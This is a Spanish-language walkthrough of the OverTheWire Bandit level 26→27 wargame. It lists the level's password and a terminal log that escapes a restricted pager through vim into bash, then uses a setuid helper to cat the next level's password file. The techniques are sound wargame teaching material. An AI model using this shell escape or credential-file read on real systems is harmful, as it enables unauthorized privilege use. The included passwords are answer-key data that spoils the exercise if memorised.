## Bandit Level 26 → Level 27
## Objetivo
Good job getting a shell! Now hurry and grab the password for bandit27!
## Datos de acceso al nivel
```
bandit26 - c7GvcKlw9mC7aUQaPx7nwFstuAIBw1o1
```
## Solución
```cmd
| | | (_) | |__ \ / /
| |__ __ _ _ __ __| |_| |_ ) / /_
| '_ \ / _` | '_ \ / _` | | __| / / '_ \
--More--(66%)
v
_ _ _ _ ___ __
| | | (_) | |__ \ / /
| |__ __ _ _ __ __| |_| |_ ) / /_
| '_ \ / _` | '_ \ / _` | | __| / / '_ \
| |_) | (_| | | | | (_| | | |_ / /| (_) |
"~/text.txt" [readonly] 6L, 258B
:set shell=/bin/bash
:shell
[No write since last change]
bandit26@bandit:~$ bandit26@bandit:~$ ls
bandit27-do text.txt
bandit26@bandit:~$ ./bandit27-do id
uid=11026(bandit26) gid=11026(bandit26) euid=11027(bandit27) groups=11026(bandit26)
bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27
YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS
bandit26@bandit:~$
bandit26@bandit:~$ exit
:qa!
q
```

## Notas adicionales
- clear es para borrar pantalla
- 
## Referencias